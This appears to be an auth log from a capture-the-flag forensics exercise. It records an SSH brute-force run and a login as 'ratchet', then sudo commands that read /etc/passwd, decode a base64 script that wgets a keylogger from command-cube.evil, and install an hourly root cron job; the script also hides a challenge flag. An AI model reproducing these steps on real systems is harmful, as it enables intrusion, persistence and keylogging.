Apr 18 15:34:48 a952d0d9ca03 sshd[2598]: Failed password for invalid user aws from 172.30.185.14 port 35108 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2598]: Connection closed by invalid user aws 172.30.185.14 port 35108 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2600]: Invalid user ladmin from 172.30.185.16 port 44526
Apr 18 15:34:48 a952d0d9ca03 sshd[2600]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2600]: Failed none for invalid user ladmin from 172.30.185.16 port 44526 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2602]: Invalid user PRUEBA from 172.30.185.12 port 46876
Apr 18 15:34:48 a952d0d9ca03 sshd[2600]: Failed password for invalid user ladmin from 172.30.185.16 port 44526 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2602]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2602]: Failed none for invalid user PRUEBA from 172.30.185.12 port 46876 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2600]: Connection closed by invalid user ladmin 172.30.185.16 port 44526 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2602]: Failed password for invalid user PRUEBA from 172.30.185.12 port 46876 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2602]: Connection closed by invalid user PRUEBA 172.30.185.12 port 46876 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2606]: Invalid user nexus from 172.30.185.13 port 60536
Apr 18 15:34:48 a952d0d9ca03 sshd[2606]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2606]: Failed none for invalid user nexus from 172.30.185.13 port 60536 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2606]: Failed password for invalid user nexus from 172.30.185.13 port 60536 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2606]: Connection closed by invalid user nexus 172.30.185.13 port 60536 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2604]: Invalid user teest from 172.30.185.15 port 38070
Apr 18 15:34:48 a952d0d9ca03 sshd[2604]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2604]: Failed none for invalid user teest from 172.30.185.15 port 38070 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2610]: Invalid user technik from 172.30.185.11 port 37976
Apr 18 15:34:48 a952d0d9ca03 sshd[2610]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2610]: Failed none for invalid user technik from 172.30.185.11 port 37976 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2604]: Failed password for invalid user teest from 172.30.185.15 port 38070 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2604]: Connection closed by invalid user teest 172.30.185.15 port 38070 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2610]: Failed password for invalid user technik from 172.30.185.11 port 37976 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2610]: Connection closed by invalid user technik 172.30.185.11 port 37976 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2608]: Invalid user tigergraph from 172.30.185.10 port 32886
Apr 18 15:34:48 a952d0d9ca03 sshd[2608]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2608]: Failed none for invalid user tigergraph from 172.30.185.10 port 32886 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2608]: Failed password for invalid user tigergraph from 172.30.185.10 port 32886 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2608]: Connection closed by invalid user tigergraph 172.30.185.10 port 32886 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2612]: Invalid user aws from 172.30.185.14 port 35116
Apr 18 15:34:48 a952d0d9ca03 sshd[2612]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2612]: Failed none for invalid user aws from 172.30.185.14 port 35116 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2612]: Failed password for invalid user aws from 172.30.185.14 port 35116 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2612]: Connection closed by invalid user aws 172.30.185.14 port 35116 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2614]: Invalid user ladmin from 172.30.185.16 port 44534
Apr 18 15:34:48 a952d0d9ca03 sshd[2614]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2614]: Failed none for invalid user ladmin from 172.30.185.16 port 44534 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2614]: Failed password for invalid user ladmin from 172.30.185.16 port 44534 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2614]: Connection closed by invalid user ladmin 172.30.185.16 port 44534 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2616]: Invalid user PRUEBA from 172.30.185.12 port 46882
Apr 18 15:34:48 a952d0d9ca03 sshd[2616]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2618]: Invalid user nexus from 172.30.185.13 port 60552
Apr 18 15:34:48 a952d0d9ca03 sshd[2618]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2616]: Failed none for invalid user PRUEBA from 172.30.185.12 port 46882 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2618]: Failed none for invalid user nexus from 172.30.185.13 port 60552 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2618]: Failed password for invalid user nexus from 172.30.185.13 port 60552 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2616]: Failed password for invalid user PRUEBA from 172.30.185.12 port 46882 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2618]: Connection closed by invalid user nexus 172.30.185.13 port 60552 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2616]: Connection closed by invalid user PRUEBA 172.30.185.12 port 46882 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2624]: Invalid user tigergraph from 172.30.185.10 port 32896
Apr 18 15:34:48 a952d0d9ca03 sshd[2624]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2624]: Failed none for invalid user tigergraph from 172.30.185.10 port 32896 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2621]: Invalid user technik from 172.30.185.11 port 37990
Apr 18 15:34:48 a952d0d9ca03 sshd[2621]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2624]: Failed password for invalid user tigergraph from 172.30.185.10 port 32896 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2620]: Invalid user teest from 172.30.185.15 port 38082
Apr 18 15:34:48 a952d0d9ca03 sshd[2620]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2621]: Failed none for invalid user technik from 172.30.185.11 port 37990 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2624]: Connection closed by invalid user tigergraph 172.30.185.10 port 32896 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2620]: Failed none for invalid user teest from 172.30.185.15 port 38082 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2621]: Failed password for invalid user technik from 172.30.185.11 port 37990 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2621]: Connection closed by invalid user technik 172.30.185.11 port 37990 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2620]: Failed password for invalid user teest from 172.30.185.15 port 38082 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2620]: Connection closed by invalid user teest 172.30.185.15 port 38082 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2626]: Invalid user aws from 172.30.185.14 port 35126
Apr 18 15:34:48 a952d0d9ca03 sshd[2626]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2626]: Failed none for invalid user aws from 172.30.185.14 port 35126 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2626]: Failed password for invalid user aws from 172.30.185.14 port 35126 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2626]: Connection closed by invalid user aws 172.30.185.14 port 35126 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2628]: Invalid user ladmin from 172.30.185.16 port 44540
Apr 18 15:34:48 a952d0d9ca03 sshd[2628]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2628]: Failed none for invalid user ladmin from 172.30.185.16 port 44540 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2628]: Failed password for invalid user ladmin from 172.30.185.16 port 44540 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2628]: Connection closed by invalid user ladmin 172.30.185.16 port 44540 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2631]: Invalid user PRUEBA from 172.30.185.12 port 46884
Apr 18 15:34:48 a952d0d9ca03 sshd[2631]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2631]: Failed none for invalid user PRUEBA from 172.30.185.12 port 46884 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2630]: Invalid user nexus from 172.30.185.13 port 60558
Apr 18 15:34:48 a952d0d9ca03 sshd[2630]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2630]: Failed none for invalid user nexus from 172.30.185.13 port 60558 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2631]: Failed password for invalid user PRUEBA from 172.30.185.12 port 46884 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2631]: Connection closed by invalid user PRUEBA 172.30.185.12 port 46884 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2630]: Failed password for invalid user nexus from 172.30.185.13 port 60558 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2630]: Connection closed by invalid user nexus 172.30.185.13 port 60558 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2634]: Invalid user technik from 172.30.185.11 port 37992
Apr 18 15:34:48 a952d0d9ca03 sshd[2634]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2634]: Failed none for invalid user technik from 172.30.185.11 port 37992 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2634]: Failed password for invalid user technik from 172.30.185.11 port 37992 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2636]: Invalid user teest from 172.30.185.15 port 38096
Apr 18 15:34:48 a952d0d9ca03 sshd[2634]: Connection closed by invalid user technik 172.30.185.11 port 37992 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2636]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2636]: Failed none for invalid user teest from 172.30.185.15 port 38096 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2636]: Failed password for invalid user teest from 172.30.185.15 port 38096 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2636]: Connection closed by invalid user teest 172.30.185.15 port 38096 [preauth]
Apr 18 15:34:48 a952d0d9ca03 sshd[2638]: Invalid user aws from 172.30.185.14 port 35136
Apr 18 15:34:48 a952d0d9ca03 sshd[2638]: error: Could not get shadow information for NOUSER
Apr 18 15:34:48 a952d0d9ca03 sshd[2638]: Failed none for invalid user aws from 172.30.185.14 port 35136 ssh2
Apr 18 15:34:48 a952d0d9ca03 sshd[2638]: Failed password for invalid user aws from 172.30.185.14 port 35136 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2638]: Connection closed by invalid user aws 172.30.185.14 port 35136 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2641]: Failed password for ratchet from 172.30.185.17 port 46314 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2641]: Connection closed by authenticating user ratchet 172.30.185.17 port 46314 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2644]: Invalid user PRUEBA from 172.30.185.12 port 46894
Apr 18 15:34:49 a952d0d9ca03 sshd[2644]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2640]: Invalid user ladmin from 172.30.185.16 port 44552
Apr 18 15:34:49 a952d0d9ca03 sshd[2640]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2644]: Failed none for invalid user PRUEBA from 172.30.185.12 port 46894 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2640]: Failed none for invalid user ladmin from 172.30.185.16 port 44552 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2644]: Failed password for invalid user PRUEBA from 172.30.185.12 port 46894 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2640]: Failed password for invalid user ladmin from 172.30.185.16 port 44552 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2640]: Connection closed by invalid user ladmin 172.30.185.16 port 44552 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2644]: Connection closed by invalid user PRUEBA 172.30.185.12 port 46894 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2645]: Invalid user nexus from 172.30.185.13 port 60568
Apr 18 15:34:49 a952d0d9ca03 sshd[2645]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2645]: Failed none for invalid user nexus from 172.30.185.13 port 60568 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2645]: Failed password for invalid user nexus from 172.30.185.13 port 60568 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2645]: Connection closed by invalid user nexus 172.30.185.13 port 60568 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2648]: Invalid user technik from 172.30.185.11 port 38008
Apr 18 15:34:49 a952d0d9ca03 sshd[2648]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2648]: Failed none for invalid user technik from 172.30.185.11 port 38008 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2648]: Failed password for invalid user technik from 172.30.185.11 port 38008 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2648]: Connection closed by invalid user technik 172.30.185.11 port 38008 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2650]: Invalid user teest from 172.30.185.15 port 38098
Apr 18 15:34:49 a952d0d9ca03 sshd[2650]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2650]: Failed none for invalid user teest from 172.30.185.15 port 38098 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2650]: Failed password for invalid user teest from 172.30.185.15 port 38098 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2650]: Connection closed by invalid user teest 172.30.185.15 port 38098 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2652]: Invalid user aws from 172.30.185.14 port 35142
Apr 18 15:34:49 a952d0d9ca03 sshd[2652]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2652]: Failed none for invalid user aws from 172.30.185.14 port 35142 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2652]: Failed password for invalid user aws from 172.30.185.14 port 35142 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2652]: Connection closed by invalid user aws 172.30.185.14 port 35142 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2657]: Invalid user ladmin from 172.30.185.16 port 44558
Apr 18 15:34:49 a952d0d9ca03 sshd[2657]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2657]: Failed none for invalid user ladmin from 172.30.185.16 port 44558 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2654]: Failed password for ratchet from 172.30.185.17 port 46330 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2654]: Connection closed by authenticating user ratchet 172.30.185.17 port 46330 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2657]: Failed password for invalid user ladmin from 172.30.185.16 port 44558 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2657]: Connection closed by invalid user ladmin 172.30.185.16 port 44558 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2656]: Invalid user PRUEBA from 172.30.185.12 port 46902
Apr 18 15:34:49 a952d0d9ca03 sshd[2656]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2656]: Failed none for invalid user PRUEBA from 172.30.185.12 port 46902 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2660]: Invalid user nexus from 172.30.185.13 port 60572
Apr 18 15:34:49 a952d0d9ca03 sshd[2660]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2660]: Failed none for invalid user nexus from 172.30.185.13 port 60572 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2656]: Failed password for invalid user PRUEBA from 172.30.185.12 port 46902 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2656]: Connection closed by invalid user PRUEBA 172.30.185.12 port 46902 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2660]: Failed password for invalid user nexus from 172.30.185.13 port 60572 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2660]: Connection closed by invalid user nexus 172.30.185.13 port 60572 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2662]: Invalid user teest from 172.30.185.15 port 38104
Apr 18 15:34:49 a952d0d9ca03 sshd[2662]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2662]: Failed none for invalid user teest from 172.30.185.15 port 38104 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2662]: Failed password for invalid user teest from 172.30.185.15 port 38104 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2662]: Connection closed by invalid user teest 172.30.185.15 port 38104 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2664]: Invalid user aws from 172.30.185.14 port 35146
Apr 18 15:34:49 a952d0d9ca03 sshd[2664]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2664]: Failed none for invalid user aws from 172.30.185.14 port 35146 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2664]: Failed password for invalid user aws from 172.30.185.14 port 35146 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2664]: Connection closed by invalid user aws 172.30.185.14 port 35146 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2668]: Invalid user magcpt from 172.30.185.18 port 54794
Apr 18 15:34:49 a952d0d9ca03 sshd[2668]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2669]: Invalid user ladmin from 172.30.185.16 port 44574
Apr 18 15:34:49 a952d0d9ca03 sshd[2669]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2668]: Failed none for invalid user magcpt from 172.30.185.18 port 54794 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2669]: Failed none for invalid user ladmin from 172.30.185.16 port 44574 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2668]: Failed password for invalid user magcpt from 172.30.185.18 port 54794 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2666]: Failed password for ratchet from 172.30.185.17 port 46346 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2669]: Failed password for invalid user ladmin from 172.30.185.16 port 44574 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2666]: Connection closed by authenticating user ratchet 172.30.185.17 port 46346 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2668]: Connection closed by invalid user magcpt 172.30.185.18 port 54794 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2669]: Connection closed by invalid user ladmin 172.30.185.16 port 44574 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2672]: Invalid user nexus from 172.30.185.13 port 60588
Apr 18 15:34:49 a952d0d9ca03 sshd[2672]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2672]: Failed none for invalid user nexus from 172.30.185.13 port 60588 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2672]: Failed password for invalid user nexus from 172.30.185.13 port 60588 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2674]: Invalid user teest from 172.30.185.15 port 38118
Apr 18 15:34:49 a952d0d9ca03 sshd[2674]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2672]: Connection closed by invalid user nexus 172.30.185.13 port 60588 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2674]: Failed none for invalid user teest from 172.30.185.15 port 38118 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2674]: Failed password for invalid user teest from 172.30.185.15 port 38118 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2674]: Connection closed by invalid user teest 172.30.185.15 port 38118 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2677]: Invalid user aws from 172.30.185.14 port 35156
Apr 18 15:34:49 a952d0d9ca03 sshd[2677]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2677]: Failed none for invalid user aws from 172.30.185.14 port 35156 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2676]: Invalid user account from 172.30.185.19 port 49696
Apr 18 15:34:49 a952d0d9ca03 sshd[2676]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2677]: Failed password for invalid user aws from 172.30.185.14 port 35156 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2676]: Failed none for invalid user account from 172.30.185.19 port 49696 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2677]: Connection closed by invalid user aws 172.30.185.14 port 35156 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2676]: Failed password for invalid user account from 172.30.185.19 port 49696 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2676]: Connection closed by invalid user account 172.30.185.19 port 49696 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2680]: Accepted password for ratchet from 172.30.185.17 port 46350 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: Invalid user magcpt from 172.30.185.18 port 54804
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: Failed none for invalid user magcpt from 172.30.185.18 port 54804 ssh2
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/hostname
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/sbin/ip a
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/cat /etc/passwd
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: Failed password for invalid user magcpt from 172.30.185.18 port 54804 ssh2
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/base64 -d
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo IyEvYmluL3NoCmJlYWNvbj0iNjkyMDY4NmY3MDY1MjA3NDY4NjU3OTIwNzc2ZjZlNzQyMDY2Njk2ZTY0MjA2ZDY1MmMyMDYxNmU2NDIwNzQ2ODY5NzMyMDY2NmM2MTY3MjAyODUzNGIyZDQzNDU1MjU0N2I2ZTMzNzYzMzcyNWY2NjMwNzIzNjMzMzc1ZjM0NjIzMDc1Mzc1ZjY0MzQzNzVmNzAzMzcyMzUzMTM1MzczMzZlNjMzMzdkMjkyMDZiNjU2NTcwNzMyMDZmNmUyMDYyNjU2MTYzNmY2ZTY5NmU2NyIKZWNobyAiWyQoZGF0ZSldICQoZWNobyAkYmVhY29uIHwgeHhkIC1yIC1wKSIgPiAvdG1wL3BlcnNpc3RlbmNlCm1rZGlyIC1wIC92YXIvZGF0YQp3Z2V0IC1PIC92YXIvZGF0YS9rZXlsb2dnZXIuYmluICJodHRwOi8vY29tbWFuZC1jdWJlLmV2aWwva2V5bG9nZ2VyLmJpbiIK
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/usr/bin/tee /usr/local/bin/insider.sh
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: Connection closed by invalid user magcpt 172.30.185.18 port 54804 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/usr/bin/tee -a /etc/crontabs/root
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo '0 * * * * /usr/local/bin/insider.sh'
Apr 18 15:34:49 a952d0d9ca03 sshd[2683]: Invalid user ladmin from 172.30.185.16 port 44584
Apr 18 15:34:49 a952d0d9ca03 sshd[2683]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2683]: Failed none for invalid user ladmin from 172.30.185.16 port 44584 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2683]: Failed password for invalid user ladmin from 172.30.185.16 port 44584 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2683]: Connection closed by invalid user ladmin 172.30.185.16 port 44584 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2686]: Invalid user nexus from 172.30.185.13 port 60602
Apr 18 15:34:49 a952d0d9ca03 sshd[2686]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2686]: Failed none for invalid user nexus from 172.30.185.13 port 60602 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2686]: Failed password for invalid user nexus from 172.30.185.13 port 60602 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2686]: Connection closed by invalid user nexus 172.30.185.13 port 60602 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/sh /usr/local/bin/insider.sh
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo DONE
Apr 18 15:34:49 a952d0d9ca03 sshd[2695]: Received disconnect from 172.30.185.17 port 46350:11: disconnected by user
Apr 18 15:34:49 a952d0d9ca03 sshd[2695]: Disconnected from user ratchet 172.30.185.17 port 46350
Apr 18 15:34:49 a952d0d9ca03 sshd[2688]: Invalid user teest from 172.30.185.15 port 38122
Apr 18 15:34:49 a952d0d9ca03 sshd[2688]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2688]: Failed none for invalid user teest from 172.30.185.15 port 38122 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2688]: Failed password for invalid user teest from 172.30.185.15 port 38122 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2688]: Connection closed by invalid user teest 172.30.185.15 port 38122 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2692]: Invalid user account from 172.30.185.19 port 49706
Apr 18 15:34:49 a952d0d9ca03 sshd[2692]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2692]: Failed none for invalid user account from 172.30.185.19 port 49706 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2692]: Failed password for invalid user account from 172.30.185.19 port 49706 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2692]: Connection closed by invalid user account 172.30.185.19 port 49706 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2690]: Invalid user aws from 172.30.185.14 port 35162
Apr 18 15:34:49 a952d0d9ca03 sshd[2690]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2690]: Failed none for invalid user aws from 172.30.185.14 port 35162 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2694]: Invalid user github from 172.30.185.20 port 38626
Apr 18 15:34:49 a952d0d9ca03 sshd[2694]: error: Could not get shadow information for NOUSER
Apr 18 15:34:49 a952d0d9ca03 sshd[2690]: Failed password for invalid user aws from 172.30.185.14 port 35162 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2694]: Failed none for invalid user github from 172.30.185.20 port 38626 ssh2
Apr 18 15:34:49 a952d0d9ca03 sshd[2690]: Connection closed by invalid user aws 172.30.185.14 port 35162 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sshd[2694]: Failed password for invalid user github from 172.30.185.20 port 38626 ssh2
Apr 18 15:34:50 a952d0d9ca03 sshd[2694]: Connection closed by invalid user github 172.30.185.20 port 38626 [preauth]
Apr 18 15:34:50 a952d0d9ca03 sshd[2714]: Invalid user magcpt from 172.30.185.18 port 54810
Apr 18 15:34:50 a952d0d9ca03 sshd[2714]: error: Could not get shadow information for NOUSER
Apr 18 15:34:50 a952d0d9ca03 sshd[2714]: Failed none for invalid user magcpt from 172.30.185.18 port 54810 ssh2
Apr 18 15:34:50 a952d0d9ca03 sshd[2714]: Failed password for invalid user magcpt from 172.30.185.18 port 54810 ssh2
Apr 18 15:34:50 a952d0d9ca03 sshd[2714]: Connection closed by invalid user magcpt 172.30.185.18 port 54810 [preauth]
Apr 18 15:34:50 a952d0d9ca03 sshd[2716]: Invalid user ladmin from 172.30.185.16 port 44596
Apr 18 15:34:50 a952d0d9ca03 sshd[2716]: error: Could not get shadow information for NOUSER
